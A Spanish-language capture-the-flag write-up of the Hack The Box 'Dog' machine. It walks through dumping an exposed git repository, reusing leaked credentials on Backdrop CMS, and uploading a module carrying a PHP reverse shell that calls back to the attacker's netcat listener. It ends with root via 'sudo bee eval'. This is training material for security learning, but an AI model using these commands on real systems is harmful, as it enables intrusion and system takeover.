---
title: Dog
description: Dog es una máquina Linux de dificultad fácil que permite acceder a información sensible a través de un repositorio git expuesto, lo que conduce a la filtración de credenciales para obtener acceso como administrador a BackdropCMS. Con privilegios de administrador, el atacante puede explotar una vulnerabilidad de Remote Code Execution subiendo un archivo comprimido malicioso que contiene una backdoor en PHP, logrando así un acceso inicial al sistema. La cuenta de usuario johncusack reutiliza la misma contraseña que la de BackdropCMS. Tras comprometer esta cuenta, se descubre que el usuario puede ejecutar el binario bee con privilegios de sudo, lo que permite escalar privilegios y obtener acceso como usuario root.
date: 2025-03-14
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-dog/dog_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - hack_the_box
  - linux
  - exposure_of_information_through_directory_listing
  - insecure_storage_of_sensitive_information
  - use_of_hard_coded_credentials
  - code_injection
  - incorrect_privilege_assignment
  - reconnaissance
  - active_scanning
  - scanning_ip_blocks
  - vulnerability_scanning
  - gather_victim_host_information
  - software
  - search_victim-owned_websites
  - collection
  - data_from_information_repositories
  - code_repositories
  - credential_access
  - unsecured_credentials
  - credentials_in_files
  - valid_accounts
  - initial_access
  - exploit_public-facing_application
  - execution
  - command_and_scripting_interpreter
  - lateral_movement
  - unix_shell
  - discovery
  - account_discovery
  - local_account
  - brute_force
  - credential_stuffing
  - remote_services
  - ssh
  - privilege_escalation
  - system_owner/user_discovery
  - abuse_elevation_control_mechanism
  - sudo_and_sudo_caching

---
## Reconnaissance

### Active Scanning

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/dog:-$ ping -c 1 10.10.11.58
PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data.
64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=177 ms

--- 10.10.11.58 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 177.292/177.292/177.292/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/dog:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.58 -n -Pn -oG nmap1
Host: 10.10.11.58 ()    Status: Up
Host: 10.10.11.58 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/dog:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.58 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap detecta la presencia del directorio `.git` expuesto sobre el puerto HTTP

```terminal
/home/kali/Documents/htb/machines/dog:-$ whatweb 10.10.11.58                      
http://10.10.11.58 [200 OK] Apache[2.4.41], Content-Language[en], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.58], UncommonHeaders[x-backdrop-cache,x-generator], X-Frame-Options[SAMEORIGIN]
```

---
### Search Victim-Owned Websites

La página web cargada en el navegador muestra una interfaz mínima con vínculos limitados.

![](/assets/img/htb-writeup-dog/dog1_1.png)

En la sección `About` aparece un correo interno `support@dog.htb`, lo cual indica configuración de virtual hosting. Y la leyenda `Powered by Backdrop CMS` confirma el uso del CMS [Backdrop](https://github.com/backdrop/backdrop).

![](/assets/img/htb-writeup-dog/dog1_2.png)

El directorio `.git` accesible contiene múltiples archivos y directorios relacionados con el código fuente de la aplicación <a id="exposure-of-information-through-directory-listing" href="#cwe-548" class="cwe-ref">(CWE-548)</a>.

![](/assets/img/htb-writeup-dog/dog1_3.png)

Descargo todo el contenido del directorio para realizar el análisis en local.

```terminal
(venv)-/home/kali/Documents/htb/machines/dog:-$ /home/kali/Documents/Tools/git-dumper/git_dumper.py http://10.10.11.58/.git/ ./git

/home/kali/Documents/htb/machines/dog:-$ tree git -aL 1
git
├── core
├── files
├── .git
├── index.php
├── layouts
├── LICENSE.txt
├── README.md
├── robots.txt
├── settings.php
├── sites
└── themes
```

Dentro de settings.php aparece una cadena de conexión hacia una base de datos MySQL con credenciales en texto plano <a id="insecure-storage-of-sensitive-information" href="#cwe-922" class="cwe-ref">(CWE-922)</a>.

```terminal
/home/kali/Documents/htb/machines/dog:-$ cat git/settings.php
...[snip]...

mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop

...[snip]...
```

Revisando los archivos generales del repositorio clonado, al final de standard.info se encuentra especificada la versión utilizada del CMS `1.27.1`.

```terminal
/home/kali/Documents/htb/machines/dog:-$ tail -n 4 ./git/core/profiles/standard/standard.info
; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```

Finalmente, buscando por el dominio dog.htb dentro, es posible identificar una dirección de correo asociada a un posible usuario valido 'tiffany'.

```terminal
/home/kali/Documents/htb/machines/dog:-$ grep -rE "@dog.htb"
git/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Esta combinación de credenciales `tiffany`:`BackDropJ2024DS2024` funciona para iniciar sesión como administrador en el panel del CMS del servicio web <a id="use-of-hard-coded-credentials" href="#cwe-798" class="cwe-ref">(CWE-798)</a>.

![](/assets/img/htb-writeup-dog/dog1_4.png)

---
## Initial Access

### Exploit Public-Facing Application

El entorno es ideal para explotar la vulnerabilidad de [Authenticated Remote Command Execution](https://www.exploit-db.com/exploits/52021), presente en `Backdrop CMS 1.27.1` y accesible únicamente para usuarios autenticados. El objetivo es cargar un módulo malicioso que permita ejecutar código PHP arbitrario y obtener una reverse shell <a id="code-injection" href="#cwe-94" class="cwe-ref">(CWE-94)</a>.

En lugar de usar directamente el exploit de Exploit-DB, puedo reutilizar el repositorio `.git` clonado previamente y hacerlo de forma manual.

* Clono la estructura de un módulo existente `email` y la reutilizo para crear el módulo malicioso.
* Descargo una reverse shell en PHP, en este caso utilizo la de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell), y lo reemplazo con el archivo `email.module`.
* Modifico los valores de ip y puerto en el script PHP.

```terminal
/home/kali/Documents/htb/machines/dog:-$ cp -r git/core/modules/email ./exploit

/home/kali/Documents/htb/machines/dog:-$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O exploit/email.module

/home/kali/Documents/htb/machines/dog:-$ sed -i "s/\$ip = '127\.0\.0\.1'/\$ip = '10.10.16.64'/" exploit/email.module
/home/kali/Documents/htb/machines/dog:-$ sed -i "s/\$port = 1234/\$port = 4321/" exploit/email.module
```

Luego comprimo el módulo en un archivo `.tar` y dejo netcat a la escucha.

```terminal
/home/kali/Documents/htb/machines/dog:-$ tar -cvf exploit.tar exploit/
exploit/
exploit/email.info
exploit/tests/
exploit/tests/email.tests.info
exploit/tests/email.test
exploit/email.install
exploit/email.module

/home/kali/Documents/htb/machines/dog:-$ nc -lnvp 4321
	listening on [any] 4321 ...
```

Para ejecutar el modulo malicioso, accedo al panel como tiffany y me dirijo a: 
* `Functionality` > `Install new modules` > `Manual Installation` > `Upload a module, theme or layout archive to install`.

Una vez cargado el archivo `.tar`, hago clic en `Enable newly added module` para ejecutar la reverse shell. Si esta no se activa, navegar a `Browse more modules`, y buscar el módulo malicioso para lo activarlo manualmente.

{% include embed/video.html src='assets/img/htb-writeup-dog/dog1_5.webm' types='webm' title='Authenticated Remote Command Execution' autoplay=true loop=true muted=true %}

```terminal
	... connect to [10.10.16.64] from (UNKNOWN) [10.10.11.58] 57082
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

Establezco una terminal interactiva completa para facilitar la navegación y ejecución de comandos.

```terminal
$ script /dev/null -c bash
www-data@dog:/$ ^Z

/home/kali/Documents/htb/machines/dog:-$ stty raw -echo;fg
[1]  + 329978 continued  nc -lnvp 4321
                                      reset xterm

www-data@dog:/$ export TERM=xterm
www-data@dog:/$ export SHELL=bash
www-data@dog:/$ stty rows 35 columns 138
```

Enumero los usuarios del sistema con shells válidos.

```terminal
www-data@dog:/$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

Encuentro que el usuario `johncusack` reutiliza la misma contraseña que `tiffany`. Esto me permite pivotear mediante SSH con sus credenciales.

```terminal
/home/kali/Documents/htb/machines/dog:-$ ssh johncusack@dog.htb      
johncusack@dog.htb's password: BackDropJ2024DS2024

johncusack@dog:~$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)

johncusack@dog:~$ cat user.txt
```

---
## Privilege Escalation

### Abuse Elevation Control Mechanism

Al verificar los permisos `sudo` del usuario actual, se puede apreciar que el binario `/usr/local/bin/bee` puede ejecutarse como cualquier usuario, incluyendo `root` <a id="incorrect-privilege-assignment" href="#cwe-266" class="cwe-ref">(CWE-266)</a>.

```terminal
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: BackDropJ2024DS2024
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Se trata de [bee](https://github.com/backdrop-contrib/bee), una herramienta oficial para interactuar con sitios Backdrop CMS.

```terminal
johncusack@dog:~$ /usr/local/bin/bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

...[snip]...

 ADVANCED

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

Dentro de las opciones avanzadas, la funcionalidad [eval](https://www.php.net/manual/en/function.eval.php) permite ejecutar código PHP arbitrario tras cargar el entorno del CMS. Este vector puede aprovecharse directamente para obtener una shell como `root`.

Para que la herramienta funcione correctamente, es necesario ejecutarla desde el directorio donde se encuentra instalado el CMS, o utilizar la flag `--root`. De lo contrario, el entorno Backdrop no se carga.

```terminal
johncusack@dog:~$ sudo /usr/local/bin/bee users
[sudo] password for johncusack: BackDropJ2024DS2024

 ✘  The required bootstrap level for 'users' is not ready.

johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee users
[sudo] password for johncusack: BackDropJ2024DS2024
| User ID | Username          | Email                      | Roles         | Last Login          | Status |
| 1       | jPAdminB          | jPAdminB@dog.htb           | administrator | 10/07/2024 - 4:02am | Active |
| 2       | jobert            | jobert@dog.htb             | administrator | 10/07/2024 - 5:33pm | Active |
| 3       | dogBackDropSystem | dogBackDroopSystem@dog.htb | administrator | 15/08/2024 - 7:52pm | Active |
| 5       | john              | john@dog.htb               | administrator | Never               | Active |
| 6       | morris            | morris@dog.htb             | administrator | Never               | Active |
| 7       | axel              | axel@dog.htb               | administrator | Never               | Active |
| 8       | rosa              | rosa@dog.htb               | administrator | Never               | Active |
| 10      | tiffany           | tiffany@dog.htb            | administrator | 23/07/2025 - 9:55pm | Active |
```

Ejecuto el binario desde el directorio `/var/www/html`, donde reside la instalación de Backdrop CMS. Y utilizo el comando `eval` para ejecutar código PHP como `root`.


```terminal
johncusack@dog:/var/www/html$ sudo bee eval 'system("id")'
uid=0(root) gid=0(root) groups=0(root)
```

La ejecución de código arbitrario en contexto privilegiado permite obtener una shell como `root`, completando así la escalada de privilegios.

```terminal
johncusack@dog:/var/www/html$ sudo bee eval 'system("bash")'

root@dog:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)

root@dog:/var/www/html# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/651" target="_blank">Dog Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }

---
## Common Weakness

| CWE ID | Name | Description |
| :--- | :--- | :--- |
| <a id="cwe-548" href="https://cwe.mitre.org/data/definitions/548.html" target="_blank">CWE-548</a> | <a href="#exposure-of-information-through-directory-listing" class="vuln-ref">Exposure of Information Through Directory Listing</a> | The product inappropriately exposes a directory listing with an index of all the resources located inside of the directory.
| <a id="cwe-922" href="https://cwe.mitre.org/data/definitions/922.html" target="_blank">CWE-922</a> | <a href="#insecure-storage-of-sensitive-information" class="vuln-ref">Insecure Storage of Sensitive Information</a> | The product stores sensitive information without properly limiting access by unauthorized actors.
| <a id="cwe-798" href="https://cwe.mitre.org/data/definitions/798.html" target="_blank">CWE-798</a> | <a href="#use-of-hard-coded-credentials" class="vuln-ref">Use of Hard-coded Credentials</a> | The product contains hard-coded credentials, such as a password or cryptographic key.
| <a id="cwe-94" href="https://cwe.mitre.org/data/definitions/94.html" target="_blank">CWE-94</a> | <a href="#code-injection" class="vuln-ref">Code Injection</a> | The product constructs a code segment using externally-influenced input from an upstream component.
| <a id="cwe-266" href="https://cwe.mitre.org/data/definitions/266.html" target="_blank">CWE-266</a> | <a href="#incorrect-privilege-assignment" class="vuln-ref">Incorrect Privilege Assignment</a> | A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor.

---
## MITRE ATT&CK Matrix

| Tactics | Techniques | Sub-Techniques | ID |
| :--- | :--- | :--- | :---: |
| [**`Reconnaissance`**](#reconnaissance) | | | <a href="https://attack.mitre.org/tactics/TA0043/" target="_blank">**`TA0043`**</a>
| | [*Active Scanning*](#active-scanning) | | <a href="https://attack.mitre.org/techniques/T1595/" target="_blank">*T1595*</a>
| | | [*Scanning IP Blocks*](#active-scanning) | <a href="https://attack.mitre.org/techniques/T1595/001/" target="_blank">*T1595.001*</a>
| | | [*Vulnerability Scanning*](#active-scanning) | <a href="https://attack.mitre.org/techniques/T1595/002/" target="_blank">*T1595.002*</a>
| | [*Gather Victim Host Information*](#active-scanning) | | <a href="https://attack.mitre.org/techniques/T1592/" target="_blank">*T1592*</a>
| | | [*Software*](#active-scanning) | <a href="https://attack.mitre.org/techniques/T1592/002/" target="_blank">*T1592.002*</a>
| | [*Search Victim-Owned Websites*](#search-victim-owned-websites) | | <a href="https://attack.mitre.org/techniques/T1594/" target="_blank">*T1594*</a>
| [*Collection*](#search-victim-owned-websites) | | | <a href="https://attack.mitre.org/tactics/TA0009/" target="_blank">*TA0009*</a>
| | [*Data from Information Repositories*](#search-victim-owned-websites) | | <a href="https://attack.mitre.org/techniques/T1213/" target="_blank">*T1213*</a>
| | | [*Code Repositories*](#search-victim-owned-websites) | <a href="https://attack.mitre.org/techniques/T1213/003/" target="_blank">*T1213.003*</a>
| [*Credential Access*](#search-victim-owned-websites) | | | <a href="https://attack.mitre.org/tactics/TA0006/" target="_blank">*TA0006*</a>
| | [*Unsecured Credentials*](#search-victim-owned-websites) | | <a href="https://attack.mitre.org/techniques/T1552/" target="_blank">*T1552*</a>
| | | [*Credentials In Files*](#search-victim-owned-websites) | <a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank">*T1552.001*</a>
| | [*Valid Accounts*](#search-victim-owned-websites) | | <a href="https://attack.mitre.org/techniques/T1078/" target="_blank">*T1078*</a>
| [**`Initial Access`**](#initial-access) | | | <a href="https://attack.mitre.org/tactics/TA0001/" target="_blank">**`TA0001`**</a>
| | [*Exploit Public-Facing Application*](#exploit-public-facing-application) | | <a href="https://attack.mitre.org/techniques/T1190/" target="_blank">*T1190*</a>
| [*Execution*](#exploit-public-facing-application) | | | <a href="https://attack.mitre.org/tactics/TA0002/" target="_blank">*TA0002*</a>
| | [*Command and Scripting Interpreter*](#exploit-public-facing-application) | | <a href="https://attack.mitre.org/techniques/T1059/" target="_blank">*T1059*</a>
| [**`Lateral Movement`**](#lateral-movement) | | |   <a href="https://attack.mitre.org/tactics/TA0008/" target="_blank">**`TA0008`**</a>
| | | [*Unix Shell*](#lateral-movement) | <a href="https://attack.mitre.org/techniques/T1059/004/" target="_blank">*T1059.004*</a>
| [*Discovery*](#lateral-movement) | | | <a href="https://attack.mitre.org/techniques/TA0007/" target="_blank">*TA0007*</a>
| | [*Account Discovery*](#lateral-movement) | | <a href="https://attack.mitre.org/techniques/T1087/" target="_blank">*T1087*</a>
| | | [*Local Account*](#lateral-movement) | <a href="https://attack.mitre.org/techniques/T1087/001/" target="_blank">*T1087.001*</a>
| | [*Brute Force*](#lateral-movement) | | <a href="https://attack.mitre.org/techniques/T1110/" target="_blank">*T1110*</a>
| | | [*Credential Stuffing*](#lateral-movement) | <a href="https://attack.mitre.org/techniques/T1110/004/" target="_blank">*T1110.004*</a>
| | [*Remote Services*](#lateral-movement) | | <a href="https://attack.mitre.org/techniques/T1021/" target="_blank">*T1021*</a>
| | | [*SSH*](#lateral-movement) | <a href="https://attack.mitre.org/techniques/T1021/004" target="_blank">*T1021.004*</a>
| [**`Privilege Escalation`**](#privilege-escalation) | | | <a href="https://attack.mitre.org/tactics/TA0004/" target="_blank">**`TA0004`**</a>
| | [*System Owner/User Discovery*](#abuse-elevation-control-mechanism) | | <a href="https://attack.mitre.org/techniques/T1033/" target="_blank">*T1033*</a>
| | [*Abuse Elevation Control Mechanism*](#abuse-elevation-control-mechanism) | | <a href="https://attack.mitre.org/techniques/T1548/" target="_blank">*T1548*</a>
| | | [*Sudo and Sudo Caching*](#abuse-elevation-control-mechanism) | <a href="https://attack.mitre.org/techniques/T1548/003/" target="_blank">*T1548.003*</a>
| | | [*Unix Shell*](#abuse-elevation-control-mechanism) | <a href="https://attack.mitre.org/techniques/T1059/004/" target="_blank">*T1059.004*</a>

